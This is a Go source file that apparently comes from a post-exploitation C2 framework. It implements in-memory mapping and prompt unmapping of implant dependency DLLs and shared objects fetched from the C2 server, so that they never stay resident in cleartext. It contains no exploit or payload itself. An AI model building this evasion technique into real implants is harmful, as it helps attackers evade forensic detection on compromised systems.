// Package memdeps is the single place where in-memory DLL/SO dependency
// modules are mapped and, crucially, unmapped again.
//
// A dependency image (the Windows COFFLoader DLL, the Linux libbpf shared
// object, a module's own DLL, ...) must never stay resident in cleartext once
// the code that needed it has finished. Callers therefore do not get to keep a
// *memmod.Module: they run inside Use/Run, and the mapping is released when
// the callback returns, on both success and failure (including panics).
//
// The raw dependency bytes are resolved on every use through the resolver
// wired by the agent (SetResolver). The resolver reuses a cached image only
// when it matches the checksum supplied for that use, so a stale copy cannot
// outlive a C2 update.
package memdeps

import (
	"errors"
	"fmt"
	"sync"

	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
)

// Resolver fetches a named dependency's raw image. checksum is the SHA-256 of
// the uncompressed image the caller expects, or "" when the caller does not
// know it. A resolver may use it to reject a stale cache entry.
type Resolver func(name, checksum string) ([]byte, error)

// UseOption configures one Use call.
type UseOption func(*useOptions)

type useOptions struct {
	checksum string
}

// WithChecksum supplies the expected SHA-256 of the dependency image. The
// resolver uses it to validate a cached copy before mapping it; an empty
// checksum means the caller does not have one.
func WithChecksum(checksum string) UseOption {
	return func(o *useOptions) { o.checksum = checksum }
}

var (
	resolverMu sync.RWMutex
	resolver   Resolver
)

// SetResolver wires the function that fetches a named dependency's raw bytes.
// The agent points this at its memfs/C2 dependency fetcher. Passing nil
// disables resolution (Use then fails).
func SetResolver(fn Resolver) {
	resolverMu.Lock()
	defer resolverMu.Unlock()
	resolver = fn
}

// Use resolves the named dependency, maps it, invokes fn with the mapped
// module, and unmaps it before returning. The mapping never outlives fn.
//
// Any module obtained inside fn is only valid until fn returns; callers must
// not retain it.
func Use(name string, fn func(*memmod.Module) error, opts ...UseOption) error {
	if name == "" {
		return errors.New("memdeps: empty dependency name")
	}
	resolverMu.RLock()
	fetch := resolver
	resolverMu.RUnlock()
	if fetch == nil {
		return errors.New("memdeps: no dependency resolver configured")
	}
	var o useOptions
	for _, opt := range opts {
		if opt != nil {
			opt(&o)
		}
	}
	data, err := fetch(name, o.checksum)
	if err != nil {
		return fmt.Errorf("memdeps: resolve %s: %w", name, err)
	}
	return Run(data, fn)
}

// Run maps data, invokes fn with the mapped module, and unmaps it before
// returning. The mapping never outlives fn.
func Run(data []byte, fn func(*memmod.Module) error) error {
	if len(data) == 0 {
		return errors.New("memdeps: empty module image")
	}
	module, err := memmod.LoadLibrary(data)
	if err != nil {
		return fmt.Errorf("memdeps: map module: %w", err)
	}
	defer module.Free()
	return fn(module)
}
